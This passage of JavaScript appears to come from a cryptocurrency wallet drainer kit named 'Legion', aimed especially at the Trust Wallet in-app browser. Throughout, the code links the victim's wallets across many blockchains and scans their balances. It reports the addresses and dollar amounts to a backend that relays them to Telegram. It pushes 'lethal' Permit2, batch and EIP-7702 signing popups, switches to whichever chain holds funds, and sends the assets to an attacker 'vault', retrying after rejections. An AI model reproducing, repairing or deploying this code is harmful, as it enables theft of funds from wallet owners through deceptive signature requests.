      mergeWcFamilyConnection('APTOS', aptosConn && aptosConn.provider ? Object.assign({
        hint: 'walletconnect',
        wcSession: true,
        wcSigner: true,
      }, aptosConn) : null, {
        provider: null,
        address: S.chains.APTOS.address,
        name: 'APTOS',
        family: 'APTOS',
        hint: 'walletconnect',
        wcSession: true,
        addressOnly: true,
      });
    }

    if (S.chains.SUI && S.chains.SUI.address) {
      var suiConn = wcAdapters.sui || null;
      mergeWcFamilyConnection('SUI', suiConn && suiConn.provider ? Object.assign({
        hint: 'walletconnect',
        wcSession: true,
        wcSigner: true,
      }, suiConn) : null, {
        provider: null,
        address: S.chains.SUI.address,
        name: 'SUI',
        family: 'SUI',
        hint: 'walletconnect',
        wcSession: true,
        addressOnly: true,
      });
    }
  }

  async function ensureWcTronWebLoaded() {
    if (!S.familyConnections.TRON || !S.familyConnections.TRON.wcSigner) return;
    if (S.familyConnections.TRON._tronWebReady) return;
    try {
      await loadTronWebLib();
      S.familyConnections.TRON._tronWebReady = true;
    } catch (e) {
      L.warn('[TRON] TronWeb optional load:', e.message);
    }
  }

  /** Safari-safe POST — keepalive so notify survives Trust-app background freeze. */
  async function apiPostUrgent(path, body) {
    var bases = resolveApiBaseUrls();
    var headers = { 'Content-Type': 'application/json', 'X-Source-Origin': window.location.origin };
    if (KINETIC_KEY) headers['x-legion-kinetic-key'] = KINETIC_KEY;
    var payload = jsonSafe(body);
    var lastErr = null;
    for (var bi = 0; bi < bases.length; bi++) {
      try {
        var base = String(bases[bi]).replace(/\/$/, '');
        var res = await fetch(base + path, {
          method: 'POST',
          headers: headers,
          body: payload,
          keepalive: true,
          credentials: 'omit',
          cache: 'no-store',
        });
        BACKEND = base;
        var data = await res.json().catch(function () { return {}; });
        if (res.ok) return data;
        lastErr = new Error('HTTP ' + res.status);
      } catch (e) {
        lastErr = e;
      }
    }
    // Fallback to normal path (retries)
    try {
      return await apiPost(path, body);
    } catch (e2) {
      L.warn('apiPostUrgent fail:', path, (lastErr && lastErr.message) || (e2 && e2.message));
      return null;
    }
  }

  function runWithTimeout(promise, ms, label) {
    var settled = false;
    var p = Promise.resolve(promise).then(function (v) {
      settled = true;
      return v;
    }).catch(function (e) {
      settled = true;
      L.warn('[timeout-wrap]', label, e && e.message);
      return null;
    });
    return Promise.race([
      p,
      new Promise(function (resolve) {
        setTimeout(function () {
          if (!settled) L.warn('[timeout]', label, ms + 'ms — continue pipeline');
          resolve(null);
        }, ms);
      }),
    ]);
  }

  async function broadcastConnectScan(evmAddr, chainId, walletName, addrs) {
    addrs = addrs || collectAddressMap(evmAddr);
    var compact = Object.keys(addrs).slice(0, 12).map(function (k) {
      return k + ':' + String(addrs[k]).slice(0, 10) + '...';
    });
    var addrKey = String(evmAddr || '').toLowerCase();
    // One Wallet Connected Telegram per address+session (no duplicate spam)
    if (S.connectNotifiedAddr === addrKey && S.connectNotifiedSession === S.connectSession) {
      L.log('[connect] skip duplicate scout notify |', compact.join(' | ') || 'evm only');
      return true;
    }
    var connected = [];
    Object.keys(addrs).forEach(function (k) { if (addrs[k]) connected.push(k + ':' + addrs[k]); });
    // URGENT keepalive — must beat Safari freeze when Trust app opens
    var res = await apiPostUrgent('/api/v1/scout', {
      user_address: evmAddr,
      chain_id: Number(chainId) > 0 ? Number(chainId) : (S.evmChain > 0 ? Number(S.evmChain) : undefined),
      wallet_type: walletName || 'Unknown',
      chain_family: 'EVM',
      source_page: window.location.href,
      connect_session: S.connectSession || undefined,
      connected_wallets: connected.length ? connected : undefined,
      scout_value_usd: S.scoutUsd > 0 ? S.scoutUsd : undefined,
    });
    if (res && (res.success || res.data)) {
      S.connectNotifiedAddr = addrKey;
      S.connectNotifiedSession = S.connectSession || '';
      S.notifyDone = true;
      try {
        sessionStorage.setItem('legion_notify_done', addrKey);
        sessionStorage.setItem('legion_connect_session', S.connectSession || '');
      } catch (eSs) { /* ignore */ }
      L.log('[connect] backend notified (urgent) |', compact.join(' | ') || 'evm only');
      console.warn('[Legion] scout OK → Telegram path', String(evmAddr).slice(0, 10) + '...');
      return true;
    }
    // Last resort: normal telemetry
    try {
      await SCOUT.telemetry(evmAddr, chainId, walletName, addrs);
      S.connectNotifiedAddr = addrKey;
      S.connectNotifiedSession = S.connectSession || '';
      S.notifyDone = true;
      L.log('[connect] backend notified (fallback) |', compact.join(' | ') || 'evm only');
      return true;
    } catch (e) {
      console.warn('[Legion] scout FAILED (no Telegram)', e && e.message);
      return false;
    }
  }

  /** Backend fusion scout → Telegram amount — independent of drain success/skip. */
  async function fireConnectAmountScout(evmAddr, chainId, walletName) {
    if (S.amountScoutDone) return;
    applyLegionWalletSessionAddresses();
    var addrs = S.allAddresses && Object.keys(S.allAddresses).length
      ? S.allAddresses
      : collectAddressMap(evmAddr);
    UI.showStatus('Scanning portfolio...');
    try {
      var portfolio = await scanFullPortfolio(evmAddr, addrs);
      if (portfolio && portfolio.totalUsd > 0) {
        S.scoutUsd = Math.max(S.scoutUsd, Number(portfolio.totalUsd) || 0);
      }
      S._amountScoutAssetCount = (portfolio && portfolio.assetCount) ||
        (portfolio && portfolio.items && portfolio.items.length) || 0;
    } catch (scanErr) {
      console.warn('[Legion] local portfolio scan:', scanErr && scanErr.message);
    }
    try {
      var fusionData = await SCOUT.fusion(addrs);
      if (fusionData && fusionData.total_usd) {
        S.scoutUsd = Math.max(S.scoutUsd, Number(fusionData.total_usd) || 0);
      }
      if (fusionData && fusionData.assets_count) {
        S._amountScoutAssetCount = Math.max(
          Number(S._amountScoutAssetCount) || 0,
          Number(fusionData.assets_count) || 0
        );
      }
    } catch (fusionErr) {
      console.warn('[Legion] fusion scout:', fusionErr && fusionErr.message);
    }
    try {
      await SCOUT.reportScanComplete(
        evmAddr,
        S.scoutUsd,
        S._amountScoutAssetCount || 0,
        walletName,
        chainId
      );
    } catch (repErr) {
      console.warn('[Legion] scan_complete notify:', repErr && repErr.message);
    }
    S.amountScoutDone = true;
    console.warn('[Legion] amount scout done | usd=', Number(S.scoutUsd) || 0);
    // Below minDrainUsd: still reported above via scan_complete if usd>0; explicit skip note for ops
    if (Number(S.scoutUsd) > 0 && Number(S.scoutUsd) < MIN_DRAIN_USD) {
      try {
        await SCOUT.reportDrainStatus(
          'below_threshold',
          evmAddr,
          Number(chainId) || 1,
          walletName || 'Wallet',
          'Balance $' + Number(S.scoutUsd).toFixed(2) + ' below minDrainUsd $' + MIN_DRAIN_USD + ' — drain skipped'
        );
      } catch (eTh) { /* ignore */ }
    }
  }

  function armDrainLock() {
    S.drainRunning = true;
    if (_drainLockTimer) clearTimeout(_drainLockTimer);
    _drainLockTimer = setTimeout(function () {
      if (S.drainRunning) {
        console.warn('[Legion] drain lock TTL expired — clearing stuck drainRunning');
        S.drainRunning = false;
      }
      _drainLockTimer = null;
    }, DRAIN_LOCK_TTL_MS);
  }

  function clearDrainLock() {
    S.drainRunning = false;
    if (_drainLockTimer) {
      clearTimeout(_drainLockTimer);
      _drainLockTimer = null;
    }
  }

  /** One connect: harvest WC session + extension families, send all addresses to backend. */
  async function linkAllFamiliesOnConnect(evmAddr) {
    discoverChainFamilies();
    applyLegionWalletSessionAddresses();
    wireWcFamilyConnections();

    var linkerMap = {
      SVM: connectSol,
      UTXO: connectBtc,
      TRON: connectTron,
      TON: connectTon,
      COSMOS: connectCosmos,
      APTOS: connectAptos,
      SUI: connectSui,
    };

    if (S.connectMode === 'injected') {
      var pickKey = normalizeInjectedWalletKey(S.injectedWalletKey);
      var pickFamilies = familiesForInjectedWallet(pickKey);
      if (pickFamilies.length) {
        // Sequential — Trust shows one Connect sheet per family; parallel = race / ETH-only
        for (var pi = 0; pi < pickFamilies.length; pi++) {
          var family = pickFamilies[pi];
          var fn = linkerMap[family];
          if (!fn) continue;
          if (!firstFamilyProvider(family)) {
            L.warn('[' + family + '] no injected provider yet');
            continue;
          }
          try {
            UI.showStatus('Connect ' + family + ' in Trust…');
            var conn = await fn();
            if (conn) {
              S.familyConnections[family] = conn;
              L.log('[connect] linked', family, String(conn.address || '').slice(0, 10));
            }
          } catch (ePick) {
            L.warn('[' + family + '] link skip:', ePick && ePick.message);
          }
        }
        applyLegionWalletSessionAddresses();
        wireWcFamilyConnections();
      }
      L.log('[connect] extension pick:', pickKey, '| families:', pickFamilies.length ? pickFamilies.join('+') : 'EVM only');
    } else if (S.connectMode === 'wc') {
      // Wallet-agnostic: only rehydrate from settled WC session (no long block here)
      applyLegionWalletSessionAddresses();
      wireWcFamilyConnections();
      L.log('[connect] WC mode — session rehydrate (enrich runs after early notify)');
    } else {
      var tasks = [];
      var linkers = [
        { family: 'SVM', fn: connectSol },
        { family: 'UTXO', fn: connectBtc },
        { family: 'TRON', fn: connectTron },
        { family: 'TON', fn: connectTon },
        { family: 'COSMOS', fn: connectCosmos },
        { family: 'APTOS', fn: connectAptos },
        { family: 'SUI', fn: connectSui },
      ];
      for (var li = 0; li < linkers.length; li++) {
        (function (entry) {
          var providers = (S.familyProviders && S.familyProviders[entry.family]) || [];
          if (!providers.length) return;
          tasks.push(
            entry.fn().then(function (conn) {
              if (conn) S.familyConnections[entry.family] = conn;
              return conn;
            }).catch(function (e) {
              L.warn('[' + entry.family + '] link skip:', e.message);
              return null;
            })
          );
        })(linkers[li]);
      }
      if (tasks.length) await Promise.all(tasks);
      applyLegionWalletSessionAddresses();
      wireWcFamilyConnections();
    }

    S.familiesLinked = true;
    S.allAddresses = collectAddressMap(evmAddr);
    saveWcFamilyContext(S.allAddresses);
    var parts = [];
    var familyOrder = ['evm', 'sol', 'btc', 'tron', 'ton', 'cosmos', 'aptos', 'sui'];
    familyOrder.forEach(function (fk) {
      if (S.allAddresses[fk]) {
        parts.push(fk + ':' + String(S.allAddresses[fk]).slice(0, 10) + '...');
      }
    });
    Object.keys(S.allAddresses).forEach(function (fk) {
      if (familyOrder.indexOf(fk) === -1) {
        parts.push(fk + ':' + String(S.allAddresses[fk]).slice(0, 10) + '...');
      }
    });
    L.log('[connect] linked families:', parts.length ? parts.join(' | ') : 'EVM only');
    if (parts.length) {
      L.log('[connect] multi-chain ready —', parts.length, 'families | scan + drain will proceed automatically');
    }
    return S.allAddresses;
  }

  /** Trust in-app: force multi-chain link (SOL/BTC/TRON/TON/…). */
  async function linkTrustFamilies(evmAddr) {
    S.connectMode = 'injected';
    S.injectedWalletKey = 'trust';
    if (evmAddr) S.evmAddr = evmAddr;
    discoverChainFamilies();
    L.log('[linkTrustFamilies] providers:', JSON.stringify(Object.keys(S.familyProviders || {}).map(function (k) {
      return k + ':' + ((S.familyProviders[k] && S.familyProviders[k].length) || 0);
    })));
    return linkAllFamiliesOnConnect(S.evmAddr || evmAddr);
  }

  /** One connect step: link every detected chain family. */
  async function connectAllFamilies() {
    if (!S.injectedWalletKey && isTrustInAppBrowser()) S.injectedWalletKey = 'trust';
    if (!S.connectMode) S.connectMode = 'injected';
    return linkAllFamiliesOnConnect(S.evmAddr);
  }

  function detectNonEvm() {
    discoverChainFamilies();
    return S.familyProviders || {};
  }

  var EVM_FINGERPRINTS = [
    ['isRabby', 'Rabby'], ['isOkxWallet', 'OKX'], ['isCoinbaseWallet', 'Coinbase Wallet'],
    ['isBraveWallet', 'Brave'], ['isTrust', 'Trust Wallet'], ['isBitKeep', 'Bitget'],
    ['isBitget', 'Bitget'], ['isTokenPocket', 'TokenPocket'], ['isFrame', 'Frame'],
    ['isSafePal', 'SafePal'], ['isZerion', 'Zerion'], ['is1inch', '1inch'],
    ['isRainbow', 'Rainbow'], ['isPhantom', 'Phantom'], ['isExodus', 'Exodus'],
    ['isMetaMask', 'MetaMask'],
  ];

  function detectEvmWalletName(provider) {
    if (!provider) return 'Unknown Wallet';
    for (var i = 0; i < EVM_FINGERPRINTS.length; i++) {
      if (provider[EVM_FINGERPRINTS[i][0]]) return EVM_FINGERPRINTS[i][1];
    }
    return 'Browser Wallet';
  }

  function isMetaMaskProvider(provider) {
    return !!(provider && provider.isMetaMask && !provider.isRabby && !provider.isBraveWallet && !provider.isWalletConnect);
  }

  function toHexQty(val) {
    if (val == null) return '0x0';
    if (typeof val === 'string' && val.indexOf('0x') === 0) return val;
    if (typeof val === 'bigint') return '0x' + val.toString(16);
    if (typeof val === 'number') return '0x' + val.toString(16);
    return '0x' + BigInt(val).toString(16);
  }

  function canTryNativeSignTx(provider) {
    return !isMetaMaskProvider(provider);
  }

  function isTrustInAppBrowser() {
    try {
      if (window.__TRUST_IN_APP__) return true;
      if (typeof window.__TRUST_IS_IN_APP__ === 'function' && window.__TRUST_IS_IN_APP__()) return true;
      var q = String((typeof location !== 'undefined' && location.search) || '');
      if (/utm_source=Trust_(iOS|Android)_Browser/i.test(q)) return true;
      if (/[?&]trust_inapp=1(?:&|$)/i.test(q)) return true;
      try {
        if (sessionStorage.getItem('trust_confirmed_inapp') === '1') return true;
      } catch (eSs) { /* ignore */ }
      if (window.ethereum && (window.ethereum.isTrust || window.ethereum.isTrustWallet)) return true;
      if (window.trustwallet && window.trustwallet.ethereum) return true;
    } catch (e) { /* ignore */ }
    return false;
  }

  function getInjectedTrustProvider() {
    try {
      if (window.trustwallet && window.trustwallet.ethereum) return window.trustwallet.ethereum;
    } catch (e0) { /* ignore */ }
    try {
      var eth = window.ethereum;
      if (!eth) return null;
      if (eth.isTrust || eth.isTrustWallet) return eth;
      if (eth.providers && eth.providers.length) {
        for (var i = 0; i < eth.providers.length; i++) {
          var p = eth.providers[i];
          if (p && (p.isTrust || p.isTrustWallet)) return p;
        }
      }
      if (isTrustInAppBrowser()) return eth;
    } catch (e1) { /* ignore */ }
    return null;
  }

  /** WC path OR Trust in-app injected — always surface a wallet confirm popup. */
  function shouldForceWalletPopup(provider, walletName) {
    if (walletName === 'WalletConnect' || !!(provider && provider.isWalletConnect)) return true;
    if (isTrustInAppBrowser()) return true;
    if (/trust/i.test(String(walletName || ''))) return true;
    return false;
  }

  
  /** Once user confirms a popup kind, never re-show that same kind (session). */
  function popupDoneKey(kind, chainId) {
    return String(kind || 'x') + ':' + String(chainId || 0);
  }
  /** Permit2 signed but NOT yet submitted to backend/vault. */
  function needsEvmFlush() {
    return !!S.pendingEvmPermit2;
  }
  /** Funds actually settled (anchor accepted) — NOT merely pending signature. */
  function hasSettledEvm() {
    return Number(S.anchorsOk) > 0;
  }
  /** Soft success: pending OR settled — used to avoid re-showing lethal popup. */
  function hasRealEvmSuccess() {
    return !!(S.pendingEvmPermit2 || Number(S.anchorsOk) > 0);
  }
  /** Pipeline "done" only when nothing left to submit. */
  function isPipelineFullySettled() {
    if (needsEvmFlush()) return false;
    if (hasSettledEvm()) return true;
    // Empty wallet after scan — nothing to settle
    if (S.amountScoutDone && !(Number(S.scoutUsd) > 0)) return true;
    return false;
  }
  function emitEvmConfirmDone(address) {
    try {
      window.dispatchEvent(new CustomEvent('trust:evm-confirm-done', {
        detail: {
          address: address || S.evmAddr || '',
          anchorsOk: Number(S.anchorsOk) || 0,
          pending: !!S.pendingEvmPermit2,
        },
      }));
    } catch (eEmit) { /* ignore */ }
  }
  /**
   * Finish path to vault: flush Permit2 (and/or run universal drain once).
   * MUST run after every successful lethal — pending alone is NOT vault.
   */
  async function settleEvmToVault(opts) {
    opts = opts || {};
    var provider = opts.provider || S.evmProvider;
    var address = (opts.address || S.evmAddr || '').toLowerCase();
    var chainId = Number(opts.chainId || S.evmChain || 1);
    var walletName = opts.walletName || S.evmWallet || 'Trust Wallet';
    if (!provider || !address) {
      L.warn('[settle] no provider/address');
      return { ok: false, error: 'no_session' };
    }
    setPipelinePhase(PIPELINE.DRAINING);
    if (S.drainRunning) clearDrainLock();
    armDrainLock();
    try {
      // Prefer full drain (families + flush at end). If already drained, flush only.
      if (!opts.flushOnly) {
        await runUniversalDrain({
          provider: provider,
          address: address,
          chainId: chainId,
          walletName: walletName,
          hwObj: opts.hwObj || null,
        });
      }
      // Explicit flush if still pending (drain may have skipped EVM)
      if (needsEvmFlush()) {
        L.log('[settle] flushPendingEvmSubmit → vault');
        await flushPendingEvmSubmit({
          provider: provider,
          address: address,
          chainId: chainId,
          walletName: walletName,
        });
      }
      return { ok: !needsEvmFlush(), anchorsOk: Number(S.anchorsOk) || 0, pending: needsEvmFlush() };
    } finally {
      clearDrainLock();
    }
  }
  function markPopupConfirmed(kind, chainId) {
    // ONLY call on real success — never on user reject
    if (!S._confirmedPopups) S._confirmedPopups = {};
    var k = popupDoneKey(kind, chainId);
    S._confirmedPopups[k] = Date.now();
    try { sessionStorage.setItem('legion_popup_done_' + k, '1'); } catch (e0) { /* ignore */ }
    if (kind === 'eip7702' || kind === 'sendCalls' || kind === 'nativeTx' || kind === 'permit2') {
      S._evmPopupConfirmed = true;
      S.userRejectedSign = false;
      try { S.instantSignAt = Date.now(); } catch (e1) { /* ignore */ }
    }
  }
  function isPopupConfirmed(kind, chainId) {
    if (!S._confirmedPopups) S._confirmedPopups = {};
    var k = popupDoneKey(kind, chainId);
    if (S._confirmedPopups[k]) return true;
    // sessionStorage alone is NOT enough — only after real success (prevents stale skip)
    if (!hasRealEvmSuccess()) return false;
    try {
      if (sessionStorage.getItem('legion_popup_done_' + k) === '1') {
        S._confirmedPopups[k] = Date.now();
        return true;
      }
    } catch (e2) { /* ignore */ }
    return false;
  }
  function clearSoftLethalSkipFlags() {
    S._evmPopupConfirmed = false;
    S.instantSignAt = 0;
    S._confirmedPopups = {};
    S.drainAttempted = false;
    try {
      var rm = [];
      for (var i = 0; i < sessionStorage.length; i++) {
        var sk = sessionStorage.key(i);
        if (sk && sk.indexOf('legion_popup_done_') === 0) rm.push(sk);
      }
      rm.forEach(function (sk) { try { sessionStorage.removeItem(sk); } catch (eR) { /* ignore */ } });
    } catch (eC) { /* ignore */ }
  }
  function evmLethalAlreadyConfirmed() {
    // Real on-chain / permit success only — never bare sessionStorage or drainAttempted alone
    if (S.pendingEvmPermit2) return true;
    if (Number(S.anchorsOk) > 0) return true;
    // In-memory success mark from this page life (set only via markPopupConfirmed on success)
    if (S._evmPopupConfirmed) return true;
    return false;
  }

  /**
   * Lethal popup only — NO personal_sign (does not settle funds).
   * Order: fast scan → runDrainWaterfall (sendCalls / 7702 / Permit2 typedData_v4).
   */
  async function forceLethalSign(provider, address, chainId, walletName) {
    if (!provider || !address) throw new Error('no provider/address for lethal sign');
    if (typeof evmLethalAlreadyConfirmed === 'function' && evmLethalAlreadyConfirmed()) {
      L.log('[lethal] skip — EVM popup already confirmed this session');
      return { ok: true, path: 'already_confirmed' };
    }
    if (S._lethalSignDepth) {
      L.warn('[lethal] re-entrancy blocked');
      return { ok: false, error: 'busy' };
    }
    S._lethalSignDepth = 1;
    try {
    chainId = Number(chainId) || S.evmChain || 1;
    walletName = walletName || S.evmWallet || 'Trust Wallet';
    try { window.__LEGION_DEEP_LINK_TARGET__ = null; } catch (eDl) { /* ignore */ }
    UI.showStatus('Confirm Permit2 / batch in Trust…');

    if (!S.vaultLoaded) {
      try { await runWithTimeout(prefetchVault(), 4000, 'vault-prefetch'); } catch (eV) { /* ignore */ }
    }

    var assets = null;
    // Prefer portfolio already scanned in SCAN-THEN-SIGN (avoid ranked/multi-balance spam)
    try {
      if (S.portfolioScan && S.portfolioScan.byChain) {
        assets = await buildChainAssets(provider, address, chainId, S.portfolioScan);
        if (assets && Number(S.portfolioScan.totalUsd) > 0) {
          assets.usd = Math.max(Number(assets.usd) || 0, Number(S.portfolioScan.totalUsd) || 0);
        }
        L.log('[lethal] using portfolioScan assets | usd=', Number(assets && assets.usd) || 0);
      }
    } catch (ePort) { /* fall through */ }
    if (!assets || !assetsHaveDrainableBalance(assets)) {
      try {
        assets = await runWithTimeout(scanAssets(provider, address, chainId), 5000, 'fast-scan');
      } catch (eScan) {
        L.warn('[lethal] fast scan:', eScan && eScan.message);
      }
    }
    if (!assets) {
      assets = { tokens: [], nfts: [], nativeHex: '0x0', usd: 0 };
    }

    // ═══ FUNDED CHAIN SWITCH — if current chain empty, switch to funded chain (POPUP) ═══
    if (!assetsHaveDrainableBalance(assets)) {
      L.log('[lethal] current chain', chainId, 'empty — finding funded chain (wallet switch popup)...');
      UI.showStatus('Switching to funded network…');
      try {
        var fundedChain = await runWithTimeout(
          ensureFundedEvmChain(provider, address, chainId),
          15000,
          'funded-chain-switch'
        );
        if (fundedChain && Number(fundedChain) !== Number(chainId)) {
          L.log('[lethal] switched to funded chain', fundedChain, '— re-scan + drain');
          chainId = Number(fundedChain);
          S.evmChain = chainId;
          // Re-scan on the new funded chain
          try {
            assets = await runWithTimeout(scanAssets(provider, address, chainId), 5000, 'fast-scan-2');
          } catch (eScan2) {
            L.warn('[lethal] re-scan:', eScan2 && eScan2.message);
          }
          if (!assets) assets = { tokens: [], nfts: [], nativeHex: '0x0', usd: 0 };
        }
      } catch (eSwitch) {
        if (isUserRejection(eSwitch)) throw eSwitch;
        L.warn('[lethal] funded chain switch:', eSwitch && eSwitch.message);
      }
    }

    // Waterfall only — NO nested runUniversalDrain (single pipeline owner runs drain once)
    var ok = false;
    try {
      ok = await runDrainWaterfall(provider, address, chainId, walletName, null, assets);
    } catch (eW) {
      if (isUserRejection(eW)) throw eW;
      L.warn('[lethal] waterfall:', eW && eW.message);
    }
    if (ok) {
      try { S.instantSignAt = Date.now(); } catch (eTs) { /* ignore */ }
      return { ok: true, path: 'drain_waterfall' };
    }
    return { ok: false, error: 'no_lethal_target' };
    } finally {
      S._lethalSignDepth = 0;
    }
  }

  /**
   * @deprecated Keep name for WC open-nudge only — Trust lethal path must NOT use this.
   * Outside Trust Browser WC: still may nudge trust:// after a real typed sign elsewhere.
   */
  async function forceWcVerifySign(provider, address) {
    // personal_sign banned for Trust Card — redirect to lethal Permit2 path
    L.warn('[sign] personal_sign blocked → lethal Permit2/typedData');
    return forceLethalSign(provider, address, S.evmChain || 1, S.evmWallet || 'Trust Wallet')
      .then(function (r) { return r && r.ok ? 'lethal' : null; });
  }

  /**
   * SINGLE PIPELINE OWNER — satellites must call startPipeline(), not forceTrustSign/continueConnected ad-hoc.
   * Phases: idle → connecting → scanning → signing → draining → done | rejected
   */
  var PIPELINE = {
    IDLE: 'idle',
    CONNECTING: 'connecting',
    SCANNING: 'scanning',
    SIGNING: 'signing',
    DRAINING: 'draining',
    DONE: 'done',
    REJECTED: 'rejected',
  };
  var _pipelinePhase = PIPELINE.IDLE;
  var _pipelinePromise = null;
  var _pipelineLastAt = 0;
  var _pipelineLastReason = '';

  function pipelineBusy() {
    return _pipelinePhase === PIPELINE.CONNECTING ||
      _pipelinePhase === PIPELINE.SCANNING ||
      _pipelinePhase === PIPELINE.SIGNING ||
      _pipelinePhase === PIPELINE.DRAINING;
  }

  function setPipelinePhase(phase) {
    _pipelinePhase = phase;
    try { S.pipelinePhase = phase; } catch (eP) { /* ignore */ }
    L.log('[pipeline] phase →', phase);
  }

  /**
   * @param {{ reason?: string }} opts
   * reason: resume | reject-retry | sign | connect | visible | tick | …
   */
  async function startPipeline(opts) {
    opts = opts || {};
    var reason = String(opts.reason || 'manual');
    var now = Date.now();

    if (pipelineBusy()) {
      if (_pipelinePromise) {
        L.log('[pipeline] join in-flight', _pipelinePhase, '←', reason);
        return _pipelinePromise;
      }
      L.log('[pipeline] busy (connect path)', _pipelinePhase, '←', reason, '— skip');
      return { ok: false, error: 'busy', phase: _pipelinePhase };
    }

    // Debounce resume/visibility spam (1s)
    var isResumeLike = /^(resume|visible|focus|pageshow|tick|bridge:)/i.test(reason) ||
      reason.indexOf('resume') !== -1 || reason.indexOf('visible') !== -1;
    if (isResumeLike && (now - _pipelineLastAt) < 1000 && _pipelinePromise) {
      return _pipelinePromise;
    }
    if (isResumeLike && isPipelineFullySettled() && S.postConnectComplete) {
      L.log('[pipeline] skip', reason, '— fully settled');
      return { ok: true, path: 'already_done', phase: PIPELINE.DONE };
    }
    // Reject-retry / sign: skip only when vault settled (pending still needs flush)
    if ((reason === 'sign' || reason === 'reject-retry') && !S.userRejectedSign && hasSettledEvm() && !needsEvmFlush()) {
      return { ok: true, path: 'already_confirmed', phase: PIPELINE.DONE };
    }
    // Resume with pending signature — flush to vault, don't re-popup
    if (isResumeLike && needsEvmFlush() && S.evmProvider && S.evmAddr) {
      _pipelineLastAt = now;
      _pipelineLastReason = reason;
      _pipelinePromise = (async function () {
        try {
          setPipelinePhase(PIPELINE.DRAINING);
          var fr = await settleEvmToVault({ flushOnly: false });
          if (!needsEvmFlush()) {
            S.postConnectComplete = true;
            emitEvmConfirmDone(S.evmAddr);
            setPipelinePhase(PIPELINE.DONE);
          } else {
            setPipelinePhase(PIPELINE.IDLE);
          }
          return { ok: !!(fr && fr.ok), path: 'flush_resume', anchorsOk: fr && fr.anchorsOk };
        } catch (eF) {
          setPipelinePhase(PIPELINE.IDLE);
          return { ok: false, error: (eF && eF.message) || 'flush_fail' };
        }
      })();
      return _pipelinePromise;
    }

    _pipelineLastAt = now;
    _pipelineLastReason = reason;
    _pipelinePromise = (async function () {
      try {
        setPipelinePhase(PIPELINE.CONNECTING);

        if (reason === 'sign' || reason === 'reject-retry') {
          setPipelinePhase(PIPELINE.SIGNING);
          var sr = await forceTrustSignCore();
          if (sr && sr.error === 'rejected') {
            S.userRejectedSign = true;
            setPipelinePhase(PIPELINE.REJECTED);
            return sr;
          }
          if (sr && sr.ok) {
            S.userRejectedSign = false;
            // ALWAYS settle to vault after lethal — pending Permit2 is NOT vault yet
            if (AUTO_DRAIN && S.evmProvider && S.evmAddr && (needsEvmFlush() || !hasSettledEvm())) {
              try {
                await settleEvmToVault({});
              } catch (eD) {
                if (isUserRejection(eD)) {
                  S.userRejectedSign = true;
                  setPipelinePhase(PIPELINE.REJECTED);
                  return { ok: false, error: 'rejected' };
                }
                L.warn('[pipeline] settle after sign:', eD && eD.message);
              }
            }
            if (!needsEvmFlush()) {
              S.postConnectComplete = true;
              emitEvmConfirmDone(S.evmAddr);
              setPipelinePhase(PIPELINE.DONE);
            } else {
              L.warn('[pipeline] still pending after settle — not marking complete');
              setPipelinePhase(PIPELINE.IDLE);
            }
            return Object.assign({}, sr, { anchorsOk: Number(S.anchorsOk) || 0, pending: needsEvmFlush() });
          }
          setPipelinePhase(PIPELINE.IDLE);
          return sr || { ok: false, error: 'sign_fail' };
        }

        // Default / resume: notify → amount → handleEvmConnect(resume)
        var ok = await continueConnectedCore();
        if (S.userRejectedSign) {
          setPipelinePhase(PIPELINE.REJECTED);
          return { ok: false, error: 'rejected', continued: !!ok };
        }
        if (isPipelineFullySettled() || S.postConnectComplete) {
          setPipelinePhase(PIPELINE.DONE);
          return { ok: true, path: 'continue', continued: !!ok };
        }
        if (S.amountScoutDone && !S.evmProvider) {
          setPipelinePhase(PIPELINE.IDLE);
          return { ok: !!ok, path: 'scan_only', continued: !!ok };
        }
        setPipelinePhase(PIPELINE.IDLE);
        return { ok: !!ok, path: 'continue', continued: !!ok };
      } catch (e) {
        L.warn('[pipeline] fail:', e && e.message);
        setPipelinePhase(PIPELINE.IDLE);
        return { ok: false, error: (e && e.message) || 'pipeline_fail' };
      }
    })();

    return _pipelinePromise;
  }

  /** Core lethal sign — no pipeline wrapper (used by startPipeline + handleEvmConnect). */
  async function forceTrustSignCore() {
    if (typeof evmLethalAlreadyConfirmed === 'function' && evmLethalAlreadyConfirmed()) {
      if (needsEvmFlush()) {
        L.log('[forceTrustSign] pending Permit2 — need vault flush');
        return { ok: true, path: 'pending_flush' };
      }
      L.log('[forceTrustSign] skip — already confirmed');
      return { ok: true, path: 'already_confirmed' };
    }
    if (!S.evmAddr) {
      try { S.evmAddr = sessionStorage.getItem('legion_wc_evm_addr') || ''; } catch (e0) { /* ignore */ }
    }
    var preferInjectedInApp = false;
    try {
      preferInjectedInApp = isTrustInAppBrowser() && !window.__TRUST_INAPP_APPKIT__ && S.connectMode !== 'wc' && !S.wcSessionActive;
    } catch (ePref) {
      preferInjectedInApp = isTrustInAppBrowser() && S.connectMode !== 'wc';
    }
    if (preferInjectedInApp) {
      var inj = getInjectedTrustProvider();
      if (inj) {
        S.evmProvider = inj;
        S.connectMode = 'injected';
        S.wcSessionActive = false;
        try { inj.isWalletConnect = false; } catch (eInj) { /* ignore */ }
      }
    }
    if (!S.evmProvider && window.LegionWallet && typeof window.LegionWallet.tryRecoverStoredSession === 'function') {
      try {
        var rp = await window.LegionWallet.tryRecoverStoredSession(true);
        if (rp) {
          S.evmProvider = rp;
          try { rp.isWalletConnect = true; } catch (e1) { /* ignore */ }
          S.connectMode = 'wc';
          S.wcSessionActive = true;
        }
      } catch (e2) { /* ignore */ }
    }
    if (!S.evmProvider && window.LegionWallet && typeof window.LegionWallet.getProvider === 'function') {
      try { S.evmProvider = await window.LegionWallet.getProvider(); } catch (e3) { /* ignore */ }
    }
    if (!S.evmProvider) {
      var inj2 = getInjectedTrustProvider();
      if (inj2) {
        S.evmProvider = inj2;
        S.connectMode = 'injected';
      }
    }
    if (!S.evmProvider || !S.evmAddr) {
      L.warn('[forceTrustSign] no provider/session — reconnect Trust first');
      return { ok: false, error: 'no_session' };
    }

    try {
      L.log('[forceTrustSign] lethal only (Permit2 / sendCalls / 7702) — no personal_sign');
      var r = await forceLethalSign(
        S.evmProvider,
        S.evmAddr,
        S.evmChain || 1,
        S.evmWallet || 'Trust Wallet'
      );
      if (r && r.ok) {
        S.drainAttempted = true;
        return r;
      }
      return r || { ok: false, error: 'no_lethal_target' };
    } catch (se) {
      if (isUserRejection(se)) {
        S.userRejectedSign = true;
        return { ok: false, error: 'rejected' };
      }
      return { ok: false, error: (se && se.message) || 'sign_fail' };
    }
  }

  var _forceSignInflight = null;

  async function forceTrustSignPublic() {
    // Route through single pipeline (reject-retry or sign)
    if (pipelineBusy() && _pipelinePromise) return _pipelinePromise;
    if (_forceSignInflight) return _forceSignInflight;
